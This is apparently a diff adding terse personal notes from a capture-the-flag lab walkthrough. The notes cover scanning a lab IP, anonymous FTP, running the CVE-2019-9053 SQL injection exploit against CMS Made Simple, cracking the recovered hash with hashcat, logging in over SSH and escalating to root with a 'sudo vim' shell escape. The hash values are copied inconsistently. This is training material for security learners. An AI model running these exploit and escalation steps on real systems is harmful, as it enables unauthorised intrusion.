@@ -1,0 +1,54 @@
+Scanning :- nmap -A 10.10.241.184 -oN nmapresult
+
+Here 3 Port open ftp, tcp/http, ssh(2222)
+
+ftp anonymous login allowed :-
+ - ftp 10.10.241.184
+ - Name :- Anonymous
+ - cd pub  / Error :- 229 Entering Extended Passive Mode (|||48482|)
+ - ls
+ - mget * -> y
+ - Same password mitch as System
+ - Go in browser than run this IP :- 10.10.241.184/robots.txt
+ 
+
+Dirbuster Used to find hidden directory 
+GObuster :- gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.241.184
+
+Go to Browser :- 10.10.241.184/Simple
+
+Exploit DB :-
+ Search CMS Made simple
+ we have version 2.2.8 
+ Finded 2.2.10 - SQL Injection -> CVE :- CVE-2019-9053
+ 
+ Download Exploit :-
+  Run with :- python2 46635.py -u http://10.10.241.184/simple
+  NO module name termcolor
+  Salt Password Found :- 1dac09d92e9fa6bb2
+  Username found      :- mitch
+  Email Found 	      :- admin@admin.com
+  Password            :- 0c01f4468bd75d7a84c7eb73846e8d9
+  
+ hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac09d92e9fa6bb2 /usr/share/wordlists/rockyou.txt.gz
+ - Secret
+ 
+Login with :-
+ ssh mitch@10.10.241.184 -p 2222  
+ bash 
+ ls
+ cat user.txt - G00d j0b, keep up
+ ls /home     - sunbath
+
+
+ gtfobins -> vim -> sudo vim -c ':!/bin/sh' -> whoami -> ls -> cat root.txt
+ W3ll d0n3. You made it!
+  
+ 
+ 
+
+
+
+ 
+ 
+ 
